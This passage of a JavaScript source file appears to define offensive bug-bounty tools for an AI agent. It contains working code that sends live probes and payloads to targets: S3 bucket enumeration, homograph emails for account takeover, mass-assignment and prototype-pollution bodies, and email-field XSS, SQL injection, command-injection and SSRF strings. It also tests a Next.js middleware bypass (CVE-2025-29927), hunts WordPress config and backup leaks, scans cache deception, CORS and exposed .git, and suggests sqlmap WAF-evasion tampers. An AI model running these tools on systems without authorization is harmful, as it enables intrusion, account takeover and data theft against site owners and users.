				out.found = out.endpoints.filter((e) => e.status >= 200 && e.status < 400).length;
				if (!out.found) out.note = "No swagger endpoints found over https; retry over http or with /api prefixes.";
			} catch (e) {
				out.error = shortErr(e);
			}
			return out;
		}
	},
	{
		name: "bb_s3_probe",
		description: "Probe common AWS S3 bucket names derived from a domain (and search-engine style permutations): anonymous listing and existence checks. Keyless: direct HTTP.",
		parameters: {
			type: "object",
			additionalProperties: false,
			properties: {
				domain: { type: "string", description: "Domain/company name to derive bucket names from, e.g. example.com" }
			},
			required: ["domain"]
		},
		output: {
			schema: {
				type: "object",
				properties: {
					domain: { type: "string" },
					buckets: { type: "array", items: { type: "object", properties: { name: { type: "string" }, status: { type: "integer" }, listable: { type: "boolean" }, note: { type: "string" } }, required: ["name", "status", "listable", "note"], additionalProperties: false } },
					open: { type: "array", items: { type: "string" } }
				},
				required: ["domain", "buckets", "open"],
			},
			render: (_args, v) =>
				renderLines("bb_s3_probe", [
					"domain: " + v.domain,
					"open/listing buckets: " + (v.open.length ? v.open.join(", ") : "none"),
					...v.buckets.filter((b) => b.listable || b.status !== 404).map((b) => b.name + " -> " + b.status + (b.listable ? " (LISTABLE)" : "")),
				])
		},
		timeoutMs: 60000,
		isConcurrencySafe: () => true,
		async execute(args, exec) {
			const out = { domain: String(args.domain || ""), buckets: [], open: [] };
			try {
				const d = normalizeDomain(args.domain);
				const stem = d.split(".")[0];
				const names = [
					d, d + "-backup", d + "-bak", d + "-assets", d + "-static", d + "-data", d + "-uploads",
					d + "-prod", d + "-dev", d + "-test", d + "-media", d + "-files", d + "-public",
					"backup-" + d, "assets-" + d, "uploads-" + d, "media-" + d, "static-" + d, "data-" + d,
					"s3-" + d, "s3-" + stem, stem + "-s3", stem + "-bucket", stem + "-storage", stem + "-backup",
					stem + "-files", stem + "-uploads", stem,
				];
				await mapPool(names, 6, async (name) => {
					const forms = ["https://" + name + ".s3.amazonaws.com/", "https://s3.amazonaws.com/" + name + "/"];
					for (const u of forms) {
						try {
							const { res } = await fetchRes(u, exec, { budget: 10000 });
							const body = await readLimited(res, 1500);
							const listable = res.status === 200 && /<ListBucketResult/i.test(body);
							const note = res.status === 404 ? (body.includes("NoSuchBucket") ? "nonexistent" : "404") : body.includes("AccessDenied") ? "exists-private" : "";
							const found = out.buckets.find((b) => b.name === name);
							if (found) {
								if (listable) { found.listable = true; found.note = found.note || "listable"; }
							} else {
								out.buckets.push({ name, status: res.status, listable, note });
								if (listable && !out.open.includes(name)) out.open.push(name);
							}
							break;
						} catch {
							// try next form
						}
					}
				});
				if (!out.buckets.length) out.buckets.push({ name: d, status: 0, listable: false, note: "all probes errored (network blocked?)" });
			} catch (e) {
				out.error = shortErr(e);
			}
			return out;
		}
	},
	{
		name: "bb_punycode_gen",
		description: "Generate punycode/IDN homograph email variants of a given email (Cyrillic/Greek confusables + xn-- encoding) for 0-click account-takeover testing. Pure compute, no network.",
		parameters: {
			type: "object",
			additionalProperties: false,
			properties: {
				email: { type: "string", description: "Email to generate homograph variants for, e.g. admin@example.com" },
				cap: { type: "integer", description: "Max variants (default 18)" }
			},
			required: ["email"]
		},
		output: {
			schema: {
				type: "object",
				properties: {
					input: { type: "string" },
					variants: { type: "array", items: { type: "object", properties: { email: { type: "string" }, note: { type: "string" } }, required: ["email", "note"], additionalProperties: false } }
				},
				required: ["input", "variants"],
			},
			render: (_args, v) =>
				renderLines("bb_punycode_gen", [
					"input: " + v.input,
					...v.variants.map((x) => x.email + "  (" + x.note + ")"),
				])
		},
		timeoutMs: 5000,
		isConcurrencySafe: () => true,
		async execute(args, exec) {
			const out = { input: String(args.email || ""), variants: [] };
			try {
				const email = String(args.email || "").trim();
				if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
					out.variants.push({ email: email, note: "invalid email format" });
					return out;
				}
				const [localRaw, domainRaw] = email.split("@");
				const cap = Math.min(parseInt(args.cap || 18, 10), 40);
				const localVariants = homographVariants(localRaw, cap);
				const add = (em, note) => {
					if (em !== email && !out.variants.some((v) => v.email === em)) out.variants.push({ email: em, note });
				};
				for (const lv of localVariants) add(lv + "@" + domainRaw, "homograph local part");
				const hasNonAscii = (s) => /[^\x00-\x7f]/.test(s);
				for (const v of [...out.variants]) {
					const [l, d] = v.email.split("@");
					if (hasNonAscii(d)) add(l + "@" + punyDomain(d), "punycode domain of " + d);
				}
				const domainLabels = domainRaw.split(".");
				for (const lv of localVariants.slice(0, 6)) {
					const mixed = domainLabels.map((lab, i) => {
						const first = lab.charAt(0).toLowerCase();
						if (i === 0 && HOMOGRAPH_MAP[first]) return HOMOGRAPH_MAP[first] + lab.slice(1);
						return lab;
					});
					add(lv + "@" + mixed.join("."), "homograph local + domain prefix");
				}
				add(localRaw + "@" + punyDomain(domainRaw), "punycode domain");
				if (hasNonAscii(domainRaw)) add(localRaw + "@" + punyDomain(domainRaw), "punycode of unicode domain");
				out.variants = out.variants.slice(0, cap);
			} catch (e) {
				out.error = shortErr(e);
			}
			return out;
		}
	},
	{
		name: "bb_mass_assign_gen",
		description: "Generate a mass-assignment JSON payload battery (admin/role/tenant/billing/verification flags, nested/dot/__proto__ keys, NoSQL operators, type-confusion values) for registration/profile API testing. Pure compute, no network.",
		parameters: {
			type: "object",
			additionalProperties: false,
			properties: {},
			required: []
		},
		output: {
			schema: {
				type: "object",
				properties: {
					count: { type: "integer" },
					payloads: { type: "array", items: { type: "string" } },
					tips: { type: "array", items: { type: "string" } }
				},
				required: ["count", "payloads", "tips"],
			},
			render: (_args, v) =>
				renderLines("bb_mass_assign_gen", [
					v.count + " payloads generated:",
					...v.payloads,
					"tips: " + v.tips.join(" | "),
				])
		},
		timeoutMs: 5000,
		isConcurrencySafe: () => true,
		async execute(args, exec) {
			const out = { count: 0, payloads: [], tips: [] };
			try {
				const bat = [
					'{"isAdmin":true}', '{"admin":true}', '{"ADMIN":true}', '{"is_admin":true}', '{"isadmin":1}',
					'{"role":"admin"}', '{"role_id":1}', '{"user_priv":"admin"}', '{"is_superuser":1}', '{"super_user":true}',
					'{"org":"internal"}', '{"organization_id":1}', '{"org_slug":"internal"}',
					'{"email_verified":true}', '{"status":"active"}', '{"account_status":"active"}', '{"is_verified":1}',
					'{"plan":"pro"}', '{"subscription_id":"free"}', '{"is_premium":true}', '{"trial_ends_at":"2099-01-01"}',
					'{"account.role":"admin"}', '{"profile.role":"admin"}', '{"__proto__":{"isAdmin":true}}',
					'{"isAdmin":"false"}', '{"isAdmin":0}', '{"isAdmin":null}', '{"isAdmin":[]}',
					'{"access_level":{"$gt":0}}', '{"role":{"$ne":"user"}}',
					'{"provider":"google","provider_id":"victim@example.com"}', '{"auth_strategy":"oauth"}',
					'{"isAdmin":true,"status":"approved","email_verified":true}',
				];
				out.payloads = bat;
				out.count = bat.length;
				out.tips = [
					"try each payload as the full JSON body AND merged into the normal registration body",
					"alternate Content-Types: text/plain, application/x-www-form-urlencoded, application/xml",
					"nested keys reach internal fields; __proto__ targets prototype pollution sinks",
					"NoSQL $ne/$gt operators work on MongoDB-backed filters, not only on admin flags",
					"re-register per variant; a single elevated response is a valid finding",
				];
			} catch (e) {
				out.error = shortErr(e);
			}
			return out;
		}
	},
	{
		name: "bb_email_payloads",
		description: "Generate email-field testing payloads (RFC822 edge cases, XSS/SSRF/CRLF/SQLi/CMDi in email values, punctuation/alias/case variants, unicode). Pure compute, no network.",
		parameters: {
			type: "object",
			additionalProperties: false,
			properties: {
				email: { type: "string", description: "Base email to vary (default user@example.com)" }
			},
			required: []
		},
		output: {
			schema: {
				type: "object",
				properties: {
					input: { type: "string" },
					payloads: { type: "array", items: { type: "string" } },
					tips: { type: "array", items: { type: "string" } }
				},
				required: ["input", "payloads", "tips"],
			},
			render: (_args, v) =>
				renderLines("bb_email_payloads", [
					"input: " + v.input,
					...v.payloads,
					"tips: " + v.tips.join(" | "),
				])
		},
		timeoutMs: 5000,
		isConcurrencySafe: () => true,
		async execute(args, exec) {
			const out = { input: String(args.email || "user@example.com"), payloads: [], tips: [] };
			try {
				const raw = String(args.email || "user@example.com");
				const email = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(raw) ? raw : "user@example.com";
				const [l, d] = email.split("@");
				const L = l.charAt(0).toUpperCase() + l.slice(1);
				const base = [
					email, L + "@" + d, l.toUpperCase() + "@" + d,
					l + "+tag@example.com", l + "+test@" + d,
					l.split("").join(".") + "@" + d, (l.split("").join(".") + "@gmail.com").replace("..", "."),
					'"' + l + ' " "@' + d, "\"" + l + " name\"@" + d,
					l + "%00@evil.com", l + "%0d%0a@evil.com", l + "\r\n@evil.com",
					l + "@example.com@evil.com", l + "@" + d + "@evil.com",
					l + "@127.0.0.1", l + "@169.254.169.254", l + "@localhost", l + "@internal.local",
					'"<script>alert(1)</script>"@' + d, l + "@<script>alert(1)</script>' || 1 || '",
					l + "@'" + " OR 1=1--", l + "@'" + "; ping -c 10 127.0.0.1;'",
					"\u0430" + l.slice(1) + "@" + d, l + "@" + punyDomain("\u0430" + d),
				];
				out.payloads = base.filter((p, i) => base.indexOf(p) === i);
				out.tips = [
					"test in register, reset, profile-edit and newsletter signup; compare 200/error differences per input",
					"set an OAST (interactsh/requestbin) domain to fingerprint SSRF + header injection in outbound mail",
					"check the raw email source for injected CC/Content-Type headers, and the dashboard for stored XSS",
				];
			} catch (e) {
				out.error = shortErr(e);
			}
			return out;
		}
	},
	{
		name: "bb_nextjs_cve",
		description: "Check a Next.js app for middleware auth bypass CVE-2025-29927 via the x-middleware-subrequest header, and middleware-rewrite detection. Keyless: direct HTTP.",
		parameters: {
			type: "object",
			additionalProperties: false,
			properties: {
				url: { type: "string", description: "Next.js URL with a protected path, e.g. https://target.com/admin" }
			},
			required: ["url"]
		},
		output: {
			schema: {
				type: "object",
				properties: {
					url: { type: "string" },
					baseline: { type: "integer" },
					withHeader: { type: "integer" },
					rewriteHeader: { type: "string" },
					verdict: { type: "string" }
				},
				required: ["url", "baseline", "withHeader", "rewriteHeader", "verdict"],
			},
			render: (_args, v) =>
				renderLines("bb_nextjs_cve", [
					"target: " + v.url,
					"baseline: " + v.baseline + " | x-middleware-subrequest: " + v.withHeader,
					"x-middleware-rewrite present: " + (v.rewriteHeader || "no"),
					"verdict: " + v.verdict,
				])
		},
		timeoutMs: 30000,
		isConcurrencySafe: () => true,
		async execute(args, exec) {
			const out = { url: String(args.url || ""), baseline: 0, withHeader: 0, rewriteHeader: "", verdict: "inconclusive" };
			try {
				const base = normalizeUrl(args.url);
				const get = async (headers) => {
					try {
						const { res } = await fetchRes(base, exec, { budget: 12000, headers });
						await readLimited(res, 600);
						return { status: res.status, rewrite: res.headers.get("x-middleware-rewrite") || "" };
					} catch {
						return { status: 0, rewrite: "" };
					}
				};
				const b = await get({ "user-agent": UA });
				out.baseline = b.status;
				out.rewriteHeader = b.rewrite;
				const t = await get({ "user-agent": UA, "x-middleware-subrequest": "middleware:middleware:middleware:middleware:middleware:middleware:middleware:middleware:middleware:middleware:middleware" });
				out.withHeader = t.status;
				if (t.status === 200 && b.status >= 300 && b.status < 500) {
					out.verdict = "LIKELY CVE-2025-29927 (bypass: " + b.status + " -> 200)";
				} else if (b.status === 200 && b.status !== t.status && t.status !== 200) {
					out.verdict = "response changes with middleware header; investigate manually";
				} else if (t.status === 0) {
					out.verdict = "header probe errored; site may block it";
				} else {
					out.verdict = "no evidence of CVE-2025-29927 on this path";
				}
			} catch (e) {
				out.error = shortErr(e);
			}
			return out;
		}
	},
	{
		name: "bb_ct_fresh_assets",
		description: "List the freshest subdomain certificates from crt.sh (sorted by not_before) for racing new assets before other scanners. Keyless: crt.sh JSON.",
		parameters: {
			type: "object",
			additionalProperties: false,
			properties: {
				domain: { type: "string", description: "Domain to monitor, e.g. example.com" },
				limit: { type: "integer", description: "Max asset names (default 30)" }
			},
			required: ["domain"]
		},
		output: {
			schema: {
				type: "object",
				properties: {
					domain: { type: "string" },
					count: { type: "integer" },
					fresh: { type: "array", items: { type: "object", properties: { name: { type: "string" }, firstSeen: { type: "string" } }, required: ["name", "firstSeen"], additionalProperties: false } },
					oldest: { type: "integer" },
					note: { type: "string" }
				},
				required: ["domain", "count", "fresh", "oldest", "note"],
			},
			render: (_args, v) =>
				renderLines("bb_ct_fresh_assets", [
					"domain: " + v.domain + " (" + v.count + " certificates seen)",
					"newest assets (probe these first):",
					...v.fresh.map((a) => a.firstSeen + "  " + a.name),
					v.note ? "note: " + v.note : "",
				])
		},
		timeoutMs: 30000,
		isConcurrencySafe: () => true,
		async execute(args, exec) {
			const out = { domain: String(args.domain || ""), count: 0, fresh: [], oldest: 0, note: "" };
			try {
				const domain = normalizeDomain(args.domain);
				const limit = Math.min(parseInt(args.limit || 30, 10), 100);
				const url = "https://crt.sh/?q=%25." + encodeURIComponent(domain) + "&output=json";
				const { text } = await fetchText(url, exec, { budget: 30000, headers: { accept: "application/json" } });
				const rows = JSON.parse(text || "[]");
				if (!Array.isArray(rows)) throw new Error("crt.sh returned non-JSON");
				const seen = new Map();
				for (const r of rows) {
					const nb = r.not_before || "";
					for (const n of String(r.name_value || "").split(/\s+/)) {
						const name = String(n || "").trim();
						if (!name || name.startsWith("*")) continue;
						if (!seen.has(name) || nb > seen.get(name)) seen.set(name, nb);
					}
				}
				const all = [...seen.entries()].filter(([n]) => n.endsWith("." + domain));
				out.count = rows.length;
				out.oldest = all.length ? all.length - 1 : 0;
				const sorted = all.sort((a, b) => (a[1] < b[1] ? 1 : -1)).slice(0, limit);
				out.fresh = sorted.map(([name, firstSeen]) => ({ name, firstSeen: firstSeen.slice(0, 10) }));
				if (!out.fresh.length) out.note = "No non-wildcard certs found; try the root domain or a wildcard scope.";
			} catch (e) {
				out.error = shortErr(e);
			}
			return out;
		}
	},
	{
		name: "bb_wordpress_surf",
		description: "Surface-scan a WordPress site: version/user enumeration, wp-json REST user leaks, config/backup exposure, setup wizard, xmlrpc, debug logs. Keyless: direct HTTP.",
		parameters: {
			type: "object",
			additionalProperties: false,
			properties: {
				url: { type: "string", description: "WordPress base URL, e.g. https://target.com" }
			},
			required: ["url"]
		},
		output: {
			schema: {
				type: "object",
				properties: {
					url: { type: "string" },
					usernames: { type: "array", items: { type: "string" } },
					endpoints: { type: "array", items: { type: "object", properties: { path: { type: "string" }, status: { type: "integer" }, flag: { type: "string" } }, required: ["path", "status", "flag"], additionalProperties: false } },
					note: { type: "string" }
				},
				required: ["url", "usernames", "endpoints", "note"],
			},
			render: (_args, v) =>
				renderLines("bb_wordpress_surf", [
					"target: " + v.url,
					"usernames: " + (v.usernames.length ? v.usernames.join(", ") : "none"),
					...v.endpoints.filter((e) => e.flag).map((e) => "[" + e.flag + "] " + e.path + " -> " + e.status),
					v.note ? "note: " + v.note : "",
				])
		},
		timeoutMs: 60000,
		isConcurrencySafe: () => true,
		async execute(args, exec) {
			const out = { url: String(args.url || ""), usernames: [], endpoints: [], note: "" };
			try {
				const base = normalizeUrl(args.url).replace(/\/$/, "");
				const probes = [
					["/readme.html", ""], ["/license.txt", ""], ["/wp-login.php", ""],
					["/wp-login.php?action=register", "registration-open"],
					["/wp-json/wp/v2/users", "user-enum"],
					["/?rest_route=/wp/v2/users", "user-enum"],
					["/wp-json/wp/v2/users?per_page=100", "user-enum"],
					["/wp-config.php.bak", "config-exposed"], ["/wp-config.php.save", "config-exposed"],
					["/.env", "config-exposed"], ["/backup.zip", "archive"], ["/db.sql", "archive"], ["/dump.sql", "archive"],
					["/xmlrpc.php", "xmlrpc"], ["/wp-admin/install.php", "installer"],
					["/wp-admin/setup-config.php?step=1", "setup-wizard"],
					["/wp-content/debug.log", "debug-log"], ["/.htaccess", "dotfile"], ["/.htpasswd", "dotfile"],
					["/phpinfo.php", "phpinfo"],
				];
				await mapPool(probes, 8, async ([p, flag]) => {
					try {
						const { res } = await fetchRes(base + p, exec, { budget: 12000 });
						const body = await readLimited(res, 2500);
						let f = "";
						if (flag === "user-enum" && res.status >= 200 && res.status < 400 && /[{"'"](slug|name)["'"][: ]/.test(body)) {
							const slugs = body.match(/"slug":"([^"]+)"/g) || [];
							const names = body.match(/"name":"([^"]+)"/g) || [];
							for (const s of slugs.slice(0, 12)) out.usernames.push(s.replace(/"slug":"|"$/g, ""));
							for (const n of names.slice(0, 8)) out.usernames.push(n.replace(/"name":"|"$/g, ""));
							out.usernames = uniq(out.usernames.map((x) => x.replace(/^"slug":"|^"name":"|"$/g, "")));
							f = "users-leaked";
						} else if (flag && res.status >= 200 && res.status < 400) {
							f = flag;
							if (flag === "setup-wizard" && /setup|configure|install/i.test(body)) f = "setup-wizard-live";
						} else if (flag === "user-enum" && res.status === 401) {
							f = "rest-locked";
						} else if (flag === "xmlrpc" && res.status >= 200 && res.status < 400 && /XML-RPC/i.test(body)) {
							f = "xmlrpc-live";
						}
						out.endpoints.push({ path: p, status: res.status, flag: f });
					} catch {
						out.endpoints.push({ path: p, status: 0, flag: "" });
					}
				});
				out.endpoints.sort((a, b) => (b.flag ? 1 : 0) - (a.flag ? 1 : 0));
				out.usernames = uniq(out.usernames).slice(0, 20);
				if (!out.usernames.length) out.note = "No usernames leaked; try wpscan -e u and author-enum /?author=1.";
			} catch (e) {
				out.error = shortErr(e);
			}
			return out;
		}
	},
	{
		name: "bb_cache_deception_scan",
		description: "Web cache deception scan: harvest sensitive paths from Wayback CDX, append static suffixes/delimiters, detect cache-hit headers (X-Cache, CF-Cache-Status, Age...). Keyless: CDX + direct HTTP.",
		parameters: {
			type: "object",
			additionalProperties: false,
			properties: {
				domain: { type: "string", description: "Domain to scan, e.g. example.com" },
				limit: { type: "integer", description: "Max sensitive paths to test (default 20)" }
			},
			required: ["domain"]
		},
		output: {
			schema: {
				type: "object",
				properties: {
					domain: { type: "string" },
					scanned: { type: "integer" },
					cacheable: { type: "array", items: { type: "object", properties: { url: { type: "string" }, status: { type: "integer" }, evidence: { type: "array", items: { type: "string" } } }, required: ["url", "status", "evidence"], additionalProperties: false } },
					note: { type: "string" }
				},
				required: ["domain", "scanned", "cacheable", "note"],
			},
			render: (_args, v) =>
				renderLines("bb_cache_deception_scan", [
					"domain: " + v.domain,
					"scanned " + v.scanned + " URL variants",
					"cache-evidence hits: " + (v.cacheable.length ? v.cacheable.map((c) => c.url + " [" + c.evidence.join(", ") + "]").join(" | ") : "none"),
					v.note ? "note: " + v.note : "",
				])
		},
		timeoutMs: 90000,
		isConcurrencySafe: () => true,
		async execute(args, exec) {
			const out = { domain: String(args.domain || ""), scanned: 0, cacheable: [], note: "" };
			try {
				const domain = normalizeDomain(args.domain);
				const limit = Math.min(parseInt(args.limit || 20, 10), 40);
				const { urls, error } = await cdxUrls(domain, exec, { filterJs: false, cap: 600 });
				const sensitive = urls
					.map((u) => {
						try { return new URL(u).pathname; } catch { return ""; }
					})
					.filter((p) => /^\/(account|profile|dashboard|settings|user|admin|my-account|orders|billing|checkout|api\/|wallet|payment|cart|preferences)/i.test(p) && !/\.[a-z0-9]{2,5}$/i.test(p))
					.slice(0, limit);
				if (error && !sensitive.length) out.note = "CDX error: " + error;
				const suffixes = ["/style.css", "/main.css", "/main.js", "/test.png?x=1", "/%60test.js", "/.css", ";.css", "/style.css?cb=1"];
				const seen = new Set();
				await mapPool(sensitive, 6, async (p) => {
					for (const s of suffixes) {
						const u = "https://" + domain + p + s;
						if (seen.has(u)) continue;
						seen.add(u);
						out.scanned++;
						try {
							const { res } = await fetchRes(u, exec, { budget: 12000 });
							await readLimited(res, 800);
							const ev = cacheEvidence(res);
							if (ev.length) out.cacheable.push({ url: u, status: res.status, evidence: ev.slice(0, 4) });
						} catch {
							// skipped
						}
					}
				});
				out.cacheable = out.cacheable.slice(0, 30);
				if (!sensitive.length) out.note = (out.note ? out.note + "; " : "") + "No sensitive paths harvested from CDX; supply paths via limit/domain with a richer archive.";
			} catch (e) {
				out.error = shortErr(e);
			}
			return out;
		}
	},
	{
		name: "bb_sqli_param_hunt",
		description: "SQLi recon: harvest parameterized URLs from Wayback CDX + OTX, tag SQL-prone params (id/cat/page/search...), rank candidate hosts for ghauri/sqlmap. Keyless: CDX + OTX.",
		parameters: {
			type: "object",
			additionalProperties: false,
			properties: {
				domain: { type: "string", description: "Domain to harvest, e.g. example.com" },
				limit: { type: "integer", description: "Max URLs to return (default 40)" }
			},
			required: ["domain"]
		},
		output: {
			schema: {
				type: "object",
				properties: {
					domain: { type: "string" },
					total: { type: "integer" },
					urls: { type: "array", items: { type: "object", properties: { url: { type: "string" }, prone: { type: "array", items: { type: "string" } } }, required: ["url", "prone"], additionalProperties: false } },
					note: { type: "string" }
				},
				required: ["domain", "total", "urls", "note"],
			},
			render: (_args, v) =>
				renderLines("bb_sqli_param_hunt", [
					"domain: " + v.domain + " (" + v.total + " candidate URLs)",
					...v.urls.map((u) => (u.prone.length ? "[prone: " + u.prone.join(",") + "] " : "[param] ") + u.url),
					v.note ? "note: " + v.note : "",
				])
		},
		timeoutMs: 60000,
		isConcurrencySafe: () => true,
		async execute(args, exec) {
			const out = { domain: String(args.domain || ""), total: 0, urls: [], note: "" };
			try {
				const domain = normalizeDomain(args.domain);
				const limit = Math.min(parseInt(args.limit || 40, 10), 100);
				const [cdx, otx] = await Promise.all([cdxUrls(domain, exec, { cap: 900 }), otxUrls(domain, exec, 200)]);
				const proneRe = /^(id|cat|catid|category|page|search|q|user|name|file|order|sort|action|lang|folder|type|pid|uid|item|product|news|post|blog|download|view|tid|product_id|category_id)$/i;
				const dynamicRe = /\.(php|asp|aspx|jsp|cfm|cgi|pl)([?#]|$)/i;
				const seen = new Set();
				const rows = [];
				for (const u of [...cdx.urls, ...otx.urls]) {
					try {
						const clean = String(u).split("#")[0];
						if (seen.has(clean)) continue;
						seen.add(clean);
						const url = new URL(clean);
						const params = [...url.searchParams.keys()];
						if (!params.length || !(dynamicRe.test(url.pathname) || url.search.includes("="))) continue;
						const prone = params.filter((p) => proneRe.test(p));
						if (prone.length) rows.push({ url: clean, prone });
						else if (rows.length < limit) rows.push({ url: clean, prone: [] });
					} catch {
						// skip unparsable
					}
				}
				const ordered = [...rows].sort((a, b) => b.prone.length - a.prone.length);
				out.total = ordered.length;
				out.urls = ordered.slice(0, limit);
				if (cdx.error && !otx.error) out.note = "CDX: " + cdx.error;
				if (otx.error && !cdx.error) out.note = "OTX: " + otx.error;
				if (!out.urls.length) out.note = (out.note ? out.note + "; " : "") + "No parameterized URLs; try gau/katana locally on a bigger archive.";
			} catch (e) {
				out.error = shortErr(e);
			}
			return out;
		}
	},
	{
		name: "bb_waf_fingerprint",
		description: "Fingerprint a WAF/CDN from response headers + block-page body (Cloudflare, Sucuri, Akamai, Imperva, F5, AWS, Azure, nginx...) and suggest sqlmap tamper combos. Keyless: direct HTTP.",
		parameters: {
			type: "object",
			additionalProperties: false,
			properties: {
				url: { type: "string", description: "URL to fingerprint, e.g. https://target.com" }
			},
			required: ["url"]
		},
		output: {
			schema: {
				type: "object",
				properties: {
					url: { type: "string" },
					detected: { type: "array", items: { type: "object", properties: { waf: { type: "string" }, evidence: { type: "string" } }, required: ["waf", "evidence"], additionalProperties: false } },
					hints: { type: "array", items: { type: "string" } },
					pageNote: { type: "string" }
				},
				required: ["url", "detected", "hints", "pageNote"],
			},
			render: (_args, v) =>
				renderLines("bb_waf_fingerprint", [
					"target: " + v.url,
					"detected: " + (v.detected.length ? v.detected.map((d) => d.waf + " (" + d.evidence + ")").join(" | ") : "no WAF signature matched"),
					"tamper hints: " + (v.hints.length ? v.hints.join(" | ") : "run wafw00f for a second opinion"),
					v.pageNote ? "body: " + v.pageNote : "",
				])
		},
		timeoutMs: 25000,
		isConcurrencySafe: () => true,
		async execute(args, exec) {
			const out = { url: String(args.url || ""), detected: [], hints: [], pageNote: "" };
			try {
				const base = normalizeUrl(args.url);
				const { res } = await fetchRes(base, exec, { budget: 12000 });
				const body = await readLimited(res, 3000);
				const h = (n) => res.headers.get(n) || "";
				const sigs = [
					["Cloudflare", h("cf-ray") || /cloudflare/i.test(h("server")) ? "cf-ray/server" : ""],
					["Sucuri", h("x-sucuri-id") ? "x-sucuri-id" : ""],
					["Akamai", h("x-akamai-transformed") || h("akamai-grn") ? "x-akamai-*" : ""],
					["Imperva", h("x-iinfo") ? "x-iinfo" : ""],
					["F5 BIG-IP", /bigip|f5/i.test(h("server")) || h("x-cnection") ? "server/x-cnection" : ""],
					["AWS (LB/WAF)", /amazons3|awselb|cloudfront/i.test(h("server")) || h("x-amzn-requestid") || h("x-amz-cf-id") ? "x-amzn-*" : ""],
					["Azure", h("x-ms-request-id") ? "x-ms-request-id" : ""],
					["Sucuri/other", /sucuri/i.test(h("server")) ? "server" : ""],
					["Incapsula", h("x-iinfo") && /incap/i.test(h("server")) ? "x-iinfo" : ""],
					["Akamai GHOST", /akamaighost/i.test(h("server")) ? "server: akamaighost" : ""],
				];
				for (const [waf, ev] of sigs) if (ev) out.detected.push({ waf, evidence: ev });
				if (/cloudflare/i.test(h("server")) && !out.detected.length) out.detected.push({ waf: "Cloudflare", evidence: "server header" });
				if (/nginx/i.test(h("server")) && !out.detected.length) out.detected.push({ waf: "plain nginx (no WAF signature)", evidence: "server: nginx" });
				const tamperMap = {
					Cloudflare: "between, space2comment", Sucuri: "space2comment, randomcase",
					Akamai: "charencode, randomcase", Imperva: "space2morehash, space2comment",
					"AWS (LB/WAF)": "between, percentencode", Azure: "charunicodeencode, space2comment",
					"F5 BIG-IP": "greatest, space2comment",
				};
				for (const d of out.detected) if (tamperMap[d.waf]) out.hints.push(d.waf + " -> --tamper=" + tamperMap[d.waf]);
				if (/access denied|blocked|challenge|verify you are human|sorry/i.test(body)) out.pageNote = "block/challenge page detected in body";
			} catch (e) {
				out.error = shortErr(e);
			}
			return out;
		}
	},
	{
		name: "bb_cors_scan",
		description: "CORS misconfiguration scan: send GET + OPTIONS preflight with attacker-controlled origins (evil.com, null, sibling subdomain) and detect Access-Control-Allow-Origin reflection, wildcard-with-credentials and missing Vary: Origin. Keyless: direct HTTP.",
		parameters: {
			type: "object",
			additionalProperties: false,
			properties: { url: { type: "string", description: "Full URL to scan, e.g. https://target.com/api/account" } },
			required: ["url"]
		},
		output: {
			schema: {
				type: "object",
				properties: {
					url: { type: "string" },
					origins_tests: { type: "array", items: { type: "object", properties: { origin: { type: "string" }, method: { type: "string" }, status: { type: "integer" }, acao: { type: "string" }, acac: { type: "string" }, vary: { type: "string" }, reflected: { type: "boolean" } }, required: ["origin", "method", "status", "acao", "acac", "vary", "reflected"], additionalProperties: false } },
					findings: { type: "array", items: { type: "string" } },
					summary: { type: "string" },
					error: { type: "string" }
				},
				required: ["url", "origins_tests", "findings", "summary"]
			},
			render: (_args, v) =>
				renderLines("🌐 bb_cors_scan " + v.url, [
					v.summary,
					...(v.findings.length ? v.findings : ["no CORS misconfiguration detected"]),
					"tests: " + v.origins_tests.map((t) => `${t.origin} (${t.method}) -> ${t.acao || "no ACAO"}`).join(" | ")
				])
		},
		timeoutMs: 25000,
		isConcurrencySafe: () => true,
		async execute(args, exec) {
			const out = { url: String(args.url || ""), origins_tests: [], findings: [], summary: "", error: "" };
			try {
				const base = normalizeUrl(args.url);
				const host = new URL(base).host;
				const origins = ["https://evil.com", "null", "https://sub." + host];
				const run = async (method, origin) => {
					const headers = { origin };
					if (method === "OPTIONS") headers["access-control-request-method"] = "GET";
					try {
						let res;
						if (method === "GET") {
							const r = await fetchRes(base, exec, { budget: 8000, redirect: "manual", headers });
							res = r.res;
						} else {
							const b = withBudget(exec, 8000);
							try {
								res = await fetch(base, { method, signal: b.signal, redirect: "manual", headers: { "user-agent": UA, accept: "*/*", ...headers } });
							} finally {
								b.dispose();
							}
						}
						await readLimited(res, 200);
						const acao = res.headers.get("access-control-allow-origin") || "";
						const acac = res.headers.get("access-control-allow-credentials") || "";
						const vary = res.headers.get("vary") || "";
						let reflected = acao !== "" && acao !== "*" && (acao === origin || (origin !== "null" && acao.includes(new URL(origin).hostname)));
						return { origin, method, status: res.status, acao, acac, vary, reflected };
					} catch {
						return { origin, method, status: 0, acao: "", acac: "", vary: "", reflected: false };
					}
				};
				for (const origin of origins) {
					out.origins_tests.push(await run("GET", origin));
					out.origins_tests.push(await run("OPTIONS", origin));
				}
				for (const t of out.origins_tests) {
					if (t.reflected && t.acac === "true") out.findings.push(`reflected origin ${t.origin} + Access-Control-Allow-Credentials: true (${t.method}) — credentialed cross-origin read possible`);
					else if (t.reflected) out.findings.push(`origin reflected verbatim: ${t.origin} (${t.method})`);
					else if (t.acao === "*" && t.acac === "true") out.findings.push(`wildcard ACAO: * with credentials (${t.method}) — invalid per spec`);
				}
				if (out.origins_tests.some((t) => t.reflected) && !out.origins_tests.some((t) => /origin/i.test(t.vary))) {
					out.findings.push("reflected ACAO without Vary: Origin — cacheable cross-origin responses");
				}
				out.summary = out.findings.length
					? `${out.findings.length} CORS finding(s) — ${out.findings[0]}`
					: "no CORS misconfiguration detected";
			} catch (e) {
				out.error = shortErr(e);
			}
			return out;
		}
	},
	{
		name: "bb_git_exposure",
		description: "Detect exposed .git repositories: probe /.git/HEAD, /.git/config, /.git/index, /.git/logs/HEAD and refs for readable markers (ref:, [core], DIRC) plus directory-listing signs on /.git/. Keyless: direct HTTP.",
		parameters: {
			type: "object",
			additionalProperties: false,
			properties: { url: { type: "string", description: "Base URL to scan, e.g. https://target.com" } },
			required: ["url"]
		},
		output: {
			schema: {
				type: "object",
				properties: {
					url: { type: "string" },
					checks: { type: "array", items: { type: "object", properties: { path: { type: "string" }, status: { type: "integer" }, marker: { type: "string" } }, required: ["path", "status", "marker"], additionalProperties: false } },
					findings: { type: "array", items: { type: "string" } },
					summary: { type: "string" },
					error: { type: "string" }
				},
				required: ["url", "checks", "findings", "summary"]
			},
